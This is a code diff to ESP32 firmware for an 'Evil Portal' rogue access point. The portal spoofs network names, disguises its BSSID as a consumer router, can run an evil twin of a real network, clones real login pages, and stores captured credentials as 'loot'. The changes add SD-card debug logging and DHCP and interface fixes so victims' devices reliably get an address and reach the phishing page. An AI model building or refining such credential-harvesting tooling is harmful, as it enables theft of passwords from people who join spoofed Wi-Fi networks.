@@ -12,6 +12,9 @@
 // client has no internet to fetch external assets — that is exactly what keeps them credible.
 // Privacy: NO serial logging from the portal — above all never echo captured credentials or the
 // loot path to the console. Defining this before any header compiles out every ESP_LOGx here.
+// Kept at ESP_LOG_NONE on purpose: serial must never carry the spoofed SSID or loot path. The
+// opt-in diagnostic trace writes to SD via ep_dbg() (runtime-gated, default off) instead — it is
+// NOT the serial console, so this stays silent. See nucleo_evilportal_set_debug().
 #define LOG_LOCAL_LEVEL ESP_LOG_NONE
 #include "nucleo_evilportal.h"
 #include "nucleo_httpd.h"
@@ -20,6 +23,7 @@
 #include <string.h>
 #include <strings.h>      // strncasecmp / strcasecmp
 #include <stdio.h>
+#include <stdarg.h>       // TEMP DEBUG: ep_dbg() SD sink (revert with LOG_LOCAL_LEVEL above)
 #include <stdlib.h>
 #include <ctype.h>
 #include <dirent.h>
@@ -28,6 +32,7 @@
 
 #include "esp_log.h"
 #include "esp_wifi.h"
+#include "esp_wifi_default.h"    // esp_netif_create_default_wifi_ap / _destroy_default_wifi (STA-only boot has no AP netif)
 #include "esp_netif.h"
 #include "esp_timer.h"
 #include "esp_random.h"
@@ -38,6 +43,7 @@
 #include "lwip/inet.h"
 #include "esp_http_server.h"
 #include "esp_http_client.h"    // live captive-portal page cloning (join a real open AP, fetch its page)
+#include "nvs.h"                 // persist the opt-in SD diagnostics flag across reboots
 #include "nucleo_arb.h"         // heavy-work arbiter: ONE TLS/network job at a time (vs ANIMA online)
 #include "nucleo_evilportal_clone.h"   // pure HTML asset rewriter (F2 fidelity)
 #include "nucleo_exclusive.h"   // NX_NET_APP reclaim (~70KB); symbols resolve at link like the externs below
@@ -144,6 +150,7 @@ static void build_ssid_presets(void)
 // ---- runtime state ----------------------------------------------------------
 static volatile bool s_running;
 static volatile bool s_dhcps_ok;    // did the AP DHCP server actually come up? false -> clients stall on "Gathering IP"
+static bool s_ap_netif_created;     // true when WE created the default AP netif (STA-only boot had none); torn down on stop
 static volatile bool s_dns_run;
 static TaskHandle_t   s_dns_task;
 static httpd_handle_t s_portal;
@@ -354,6 +361,59 @@ static void timestamp(char *out, int sz)
     if (tm.tm_year + 1900 >= 2020) strftime(out, sz, "%Y-%m-%d %H:%M:%S", &tm);
     else snprintf(out, sz, "uptime+%llus", (unsigned long long)(esp_timer_get_time() / 1000000));   // no NTP yet
 }
+
+// ---- opt-in SD diagnostics --------------------------------------------------
+// A runtime-gated trace sink: when ON, appends timestamped diagnostic lines to
+// /sd/evilportal/ep-debug.log so the "DHCP KO" / "Gathering IP" start path can be traced WITHOUT a
+// serial cable (arm, reproduce, stop, then read the file over the file API or pull the card). It
+// writes heap/dhcps state and the spoofed SSID only — NEVER a captured credential — but it is still
+// OFF by default (an operator tool shouldn't leave breadcrumbs on the card unasked). The flag
+// persists in NVS so it survives a reboot: if arming ever crash-reboots the device, an operator who
+// turned it ON still gets the trace of the NEXT arm. Toggled from the app (TAB menu) via the public
+// nucleo_evilportal_set_debug(). Best-effort: no SD -> silent no-op; must never affect the start path.
+#define EP_NVS_NS   "evilportal"
+#define EP_NVS_DBG  "dbg"
+static int8_t s_ep_debug = -1;   // -1 = not yet loaded from NVS; 0 = off; 1 = on
+
+static bool ep_debug_on(void)
+{
+    if (s_ep_debug < 0) {                                 // lazy load on first use
+        s_ep_debug = 0;
+        nvs_handle_t h;
+        if (nvs_open(EP_NVS_NS, NVS_READONLY, &h) == ESP_OK) {
+            uint8_t v = 0;
+            if (nvs_get_u8(h, EP_NVS_DBG, &v) == ESP_OK) s_ep_debug = v ? 1 : 0;
+            nvs_close(h);
+        }
+    }
+    return s_ep_debug > 0;
+}
+
+static void ep_dbg(const char *fmt, ...)
+{
+    if (!ep_debug_on()) return;                           // default off: no SD writes at all
+    mkdir(PORTAL_DIR, 0775);                              // arm may not have created it yet
+    FILE *f = fopen(PORTAL_DIR "/ep-debug.log", "a");
+    if (!f) return;
+    char ts[40]; timestamp(ts, sizeof ts);
+    fprintf(f, "%s ", ts);
+    va_list ap; va_start(ap, fmt); vfprintf(f, fmt, ap); va_end(ap);
+    fputc('\n', f);
+    fclose(f);
+}
+
+void nucleo_evilportal_set_debug(bool on)
+{
+    s_ep_debug = on ? 1 : 0;
+    nvs_handle_t h;
+    if (nvs_open(EP_NVS_NS, NVS_READWRITE, &h) == ESP_OK) {
+        nvs_set_u8(h, EP_NVS_DBG, on ? 1 : 0);
+        nvs_commit(h);
+        nvs_close(h);
+    }
+}
+
+bool nucleo_evilportal_debug(void) { return ep_debug_on(); }
 
 // Record this client's password attempt. Returns the attempt count (1 = first this client sends)
 // and, for a repeat, whether the password equals what they sent before.
@@ -698,48 +758,85 @@ static void dns_task(void *arg)
 // window silently fails — the stop sees "not started", a start sees a half-initialised server,
 // and the next client gets *no* DHCPOFFER. Clients then sit on "Gathering IP address" forever.
 // Fix: wait for the auto-started dhcps to be running BEFORE we stop it to apply options.
-static void offer_captive_dns(void)
+// Pin the AP to PORTAL_IP/24 while DHCP is stopped, so a stale IP left on WIFI_AP_DEF by the OS
+// hotspot (nucleo_setup) can't strand the lease pool on the wrong subnet. A no-op when it already
+// holds the default. set_ip_info requires dhcps stopped — the caller guarantees that.
+static void pin_ap_ip(esp_netif_t *ap)
 {
-    esp_netif_t *ap = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
-    if (!ap) return;
-    // 1) Wait for the AP's own dhcps to come up (up to ~1 s). We tolerate the "no such handle"
-    //    early-boot case because dhcps_get_status returns ESP_ERR_INVALID_STATE then.
-    for (int i = 0; i < 50; i++) {
-        esp_netif_dhcp_status_t st = ESP_NETIF_DHCP_INIT;
-        if (esp_netif_dhcps_get_status(ap, &st) == ESP_OK && st == ESP_NETIF_DHCP_STARTED) break;
-        vTaskDelay(pdMS_TO_TICKS(20));
-    }
-    // 2) Options can only change while dhcps is down. Stop it, set what we need, start it back.
-    esp_err_t err_stop = esp_netif_dhcps_stop(ap);
+    esp_netif_ip_info_t ip = { 0 };
+    esp_netif_str_to_ip4(PORTAL_IP, &ip.ip);
+    esp_netif_str_to_ip4(PORTAL_IP, &ip.gw);
+    esp_netif_str_to_ip4("255.255.255.0", &ip.netmask);
+    esp_netif_set_ip_info(ap, &ip);
+}
+
+// One full apply: bring dhcps down, pin the AP IP, set the DNS-offer option (option 6, so clients
+// resolve every name to us) and — unless 'skip_opt114' — the RFC 8910 captive-portal URI, then
+// start and VERIFY the server reached STARTED. Returns true only on a confirmed running server.
+static bool dhcps_apply_once(esp_netif_t *ap, bool skip_opt114)
+{
+    esp_netif_dhcps_stop(ap);                         // options & IP can only change while down
+    pin_ap_ip(ap);
+
     uint8_t offer_dns = 0x02;                         // OFFER_DNS flag for the DHCP server
     esp_netif_dhcps_option(ap, ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER, &offer_dns, sizeof offer_dns);
     esp_netif_dns_info_t dns = { 0 };
     dns.ip.type = ESP_IPADDR_TYPE_V4;
     esp_netif_str_to_ip4(PORTAL_IP, &dns.ip.u_addr.ip4);
     esp_netif_set_dns_info(ap, ESP_NETIF_DNS_MAIN, &dns);
-    // RFC 8910 DHCP option 114 (Captive-Portal URI). Best-effort: ESP-IDF only accepts the opt-ids
-    // in its enum, and 114 is a custom numeric. On IDFs that reject it the call returns
-    // ESP_ERR_NOT_SUPPORTED — we swallow it and fall back to the HTTP probe path, which still
-    // works. Must NOT prevent dhcps_start from running or the "Gathering IP" bug returns.
-    static const char CAPTIVE_URI[] = "http://" PORTAL_IP "/api/v1/captive-portal";
-    (void)esp_netif_dhcps_option(ap, ESP_NETIF_OP_SET, 114 /* RFC 8910 */,
-                                 (void*)CAPTIVE_URI, (uint32_t)(sizeof CAPTIVE_URI - 1));
-    // 3) Restart dhcps and VERIFY it actually came back up. If it didn't, retry once with a
-    //    forced stop. We cannot ESP_LOG here (LOG_LOCAL_LEVEL compiles those out for privacy);
-    //    instead we track the final state in s_dhcps_ok so the UI can show "DHCP KO" in red,
-    //    which is the clue the user missing when clients sat on "Gathering IP address".
-    (void)err_stop;
+
+    // RFC 8910 DHCP option 114 (Captive-Portal URI) is best-effort — and the prime suspect for a
+    // dhcps that refuses to restart on some IDFs (a custom opt-id SET wedging the option table).
+    // So we set it only on the FIRST pass; every retry drops it. Captive detection still works
+    // without it via the HTTP probe path (generate_204 / hotspot-detect / ncsi served 200+HTML).
+    if (!skip_opt114) {
+        static const char CAPTIVE_URI[] = "http://" PORTAL_IP "/api/v1/captive-portal";
+        ep_dbg("  apply: opt114 SET pre");                                      // TEMP DEBUG
+        esp_err_t o114 = esp_netif_dhcps_option(ap, ESP_NETIF_OP_SET, 114 /* RFC 8910 */,
+                                     (void*)CAPTIVE_URI, (uint32_t)(sizeof CAPTIVE_URI - 1));
+        ep_dbg("  apply: opt114 SET post rc=%s", esp_err_to_name(o114));        // TEMP DEBUG
+    }
+
+    ep_dbg("  apply: dhcps_start pre");                                         // TEMP DEBUG
     esp_err_t err_start = esp_netif_dhcps_start(ap);
     esp_netif_dhcp_status_t st = ESP_NETIF_DHCP_INIT;
     esp_netif_dhcps_get_status(ap, &st);
-    if (err_start != ESP_OK || st != ESP_NETIF_DHCP_STARTED) {
-        vTaskDelay(pdMS_TO_TICKS(50));
-        esp_netif_dhcps_stop(ap);
-        vTaskDelay(pdMS_TO_TICKS(50));
-        err_start = esp_netif_dhcps_start(ap);
-        esp_netif_dhcps_get_status(ap, &st);
+    ep_dbg("  apply: dhcps_start post rc=%s st=%d", esp_err_to_name(err_start), (int)st);  // TEMP DEBUG
+    return (err_start == ESP_OK && st == ESP_NETIF_DHCP_STARTED);
+}
+
+static void offer_captive_dns(void)
+{
+    ep_dbg("dns: enter");                                                       // TEMP DEBUG
+    esp_netif_t *ap = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+    if (!ap) { ep_dbg("dns: no AP netif handle -> KO"); s_dhcps_ok = false; return; }  // TEMP DEBUG
+    // 1) Wait for the AP's own dhcps to finish auto-starting (WIFI_EVENT_AP_START fires a few ticks
+    //    after esp_wifi_start() returns) before we touch it. Up to ~1 s; INVALID_STATE early is fine.
+    for (int i = 0; i < 50; i++) {
+        esp_netif_dhcp_status_t st = ESP_NETIF_DHCP_INIT;
+        if (esp_netif_dhcps_get_status(ap, &st) == ESP_OK && st == ESP_NETIF_DHCP_STARTED) break;
+        vTaskDelay(pdMS_TO_TICKS(20));
     }
-    s_dhcps_ok = (err_start == ESP_OK && st == ESP_NETIF_DHCP_STARTED);
+    ep_dbg("dns: dhcps auto-start waited");                                     // TEMP DEBUG
+    // 2) Apply + verify, escalating: first pass WITH opt-114, every retry WITHOUT it, growing
+    //    backoff. Deterministic "DHCP KO" (restart never helped) was traced here — a single retry
+    //    that kept opt-114 lost the same way each time. We only flag OK on a confirmed STARTED;
+    //    the UI shows "DHCP KO" in red otherwise (the clue when clients sit on "Gathering IP").
+    //    We can't ESP_LOG in this file (LOG_LOCAL_LEVEL == ESP_LOG_NONE, for credential privacy).
+    bool ok = false;
+    int won = -1;
+    for (int attempt = 0; attempt < 4 && !ok; attempt++) {
+        ep_dbg("dns: attempt %d (skip_opt114=%d) pre", attempt, (int)(attempt >= 1));  // TEMP DEBUG
+        ok = dhcps_apply_once(ap, /*skip_opt114=*/ attempt >= 1);
+        ep_dbg("dns: attempt %d post ok=%d", attempt, (int)ok);                 // TEMP DEBUG
+        if (ok) won = attempt; else vTaskDelay(pdMS_TO_TICKS(60 * (attempt + 1)));
+    }
+    // TEMP DEBUG (revert with LOG_LOCAL_LEVEL above): ok on attempt 0 = opt-114 was fine; ok on a
+    // later attempt = opt-114 was wedging dhcps_start; never ok = not opt-114 (suspect lease-pool
+    // OOM — read the "exclusive: free/largest" line logged at arm time). No credentials here.
+    ESP_LOGI(TAG, "dhcps outcome: ok=%d won_attempt=%d (opt114 only on attempt 0)", (int)ok, won);
+    ep_dbg("dhcps outcome: ok=%d won_attempt=%d (opt114 only on attempt 0)", (int)ok, won);  // TEMP DEBUG
+    s_dhcps_ok = ok;
 }
 
 // Stealth BSSID for the rogue AP. The factory MAC carries an Espressif OUI — a "FRITZ!Box" with an
@@ -798,6 +895,19 @@ static esp_err_t start_ap(const char *ssid, int channel, const uint8_t *clone_bs
     }
     wc.ap.max_connection = 8;
     wc.ap.beacon_interval = 100;
+    // In STA-only mode (a saved STA network / Solo) boot never created the default AP esp_netif
+    // (nucleo_setup: `if (!s_sta_only) esp_netif_create_default_wifi_ap()`). Without it the SoftAP
+    // radio still comes up and clients associate, but there is NO integrated DHCP server behind the
+    // AP interface — so WIFI_AP_DEF is absent, offer_captive_dns() bails, and clients sit forever on
+    // "Gathering IP" (the exclamation-mark bug). Create it on demand BEFORE esp_wifi_start() below:
+    // the netif installs the handlers that auto-arm dhcps (default 192.168.4.1/24) on WIFI_EVENT_AP_
+    // START, which offer_captive_dns() then tunes. Remember we made it so stop() can tear it down.
+    if (!esp_netif_get_handle_from_ifkey("WIFI_AP_DEF")) {
+        esp_netif_t *apnif = esp_netif_create_default_wifi_ap();
+        s_ap_netif_created = (apnif != NULL);
+        ep_dbg("start_ap: AP netif was missing (STA-only); created on demand ok=%d", (int)s_ap_netif_created);
+    }
+
     esp_err_t e1 = esp_wifi_set_mode(WIFI_MODE_AP);
     // set_mac needs the interface stopped; stop, stamp the stealth BSSID, then bring it up.
     uint8_t mac[6]; stealth_ap_mac(mac, clone_bssid);
@@ -806,6 +916,16 @@ static esp_err_t start_ap(const char *ssid, int channel, const uint8_t *clone_bs
     esp_err_t e2 = esp_wifi_set_config(WIFI_IF_AP, &wc);
     esp_err_t e3 = esp_wifi_start();       // bring the AP up with the spoofed MAC
     return (e1 == ESP_OK && e2 == ESP_OK) ? ESP_OK : (e1 != ESP_OK ? e1 : e2 != ESP_OK ? e2 : e3);
+}
+
+// Tear down the default AP netif ONLY if we created it on demand (STA-only boot). A boot-created AP
+// netif is left alone. Called from the stop path and from every start failure after start_ap().
+static void destroy_ondemand_ap_netif(void)
+{
+    if (!s_ap_netif_created) return;
+    esp_netif_t *apnif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+    if (apnif) esp_netif_destroy_default_wifi(apnif);
+    s_ap_netif_created = false;
 }
 
 static esp_err_t start_server(void)
@@ -879,6 +999,8 @@ static esp_err_t start_impl(const char *ssid, int template_idx, int channel,
     nucleo_setup_suspend();
     nucleo_exclusive_info_t nxinf; nucleo_exclusive_enter(NX_NET_APP, &nxinf);
     ESP_LOGI(TAG, "exclusive: free=%u largest=%u", (unsigned)nxinf.free_after, (unsigned)nxinf.largest_after);
+    ep_dbg("ARM ssid='%s' exclusive: free=%u largest=%u", s_ep->cur_ssid,          // TEMP DEBUG
+           (unsigned)nxinf.free_after, (unsigned)nxinf.largest_after);
 
     if (!load_template(template_idx)) {
         ESP_LOGE(TAG, "template %d unavailable", template_idx);
@@ -901,7 +1023,8 @@ static esp_err_t start_impl(const char *ssid, int template_idx, int channel,
     s_twin_coherent = make_wpa2;
 
     esp_err_t err = start_ap(s_ep->cur_ssid, channel, twin ? bssid : NULL, real_auth, make_wpa2);
-    if (err != ESP_OK) { ESP_LOGE(TAG, "AP start failed: %s", esp_err_to_name(err)); nucleo_setup_apply_network(); nucleo_exclusive_exit(); free(s_ep); s_ep = NULL; return err; }
+    if (err != ESP_OK) { ESP_LOGE(TAG, "AP start failed: %s", esp_err_to_name(err)); ep_dbg("AP start FAILED: %s", esp_err_to_name(err)); nucleo_setup_apply_network(); destroy_ondemand_ap_netif(); nucleo_exclusive_exit(); free(s_ep); s_ep = NULL; return err; }
+    ep_dbg("AP up ch=%d twin=%d wpa2=%d", channel, (int)twin, (int)make_wpa2);   // TEMP DEBUG
     offer_captive_dns();                    // DHCP hands clients 192.168.4.1 as their resolver
 
     s_dns_run = true;
@@ -913,7 +1036,7 @@ static esp_err_t start_impl(const char *ssid, int template_idx, int channel,
         ESP_LOGE(TAG, "portal HTTP server failed");
         s_dns_run = false;
         for (int i = 0; i < 30 && s_dns_task; i++) vTaskDelay(pdMS_TO_TICKS(50));   // let the DNS task exit before we tear down
-        nucleo_setup_apply_network(); nucleo_exclusive_exit();   // network up first, then httpd/mDNS/voice
+        nucleo_setup_apply_network(); destroy_ondemand_ap_netif(); nucleo_exclusive_exit();   // network up first, then httpd/mDNS/voice
         free(s_ep); s_ep = NULL;                                 // don't leave the session buffer resident on a failed start
         return ESP_FAIL;
     }
@@ -1125,6 +1248,7 @@ void nucleo_evilportal_stop(void)
         esp_wifi_start();
     }
     nucleo_setup_apply_network();          // restore STA/AP from the saved config (network up first)
+    destroy_ondemand_ap_netif();           // if WE made the AP netif (STA-only boot), return to clean STA-only
     nucleo_exclusive_exit();               // restart httpd + mDNS + voice; ANIMA L1 reloads lazily
     ESP_LOGI(TAG, "Evil Portal disarmed; network + OS web UI restored");
 }
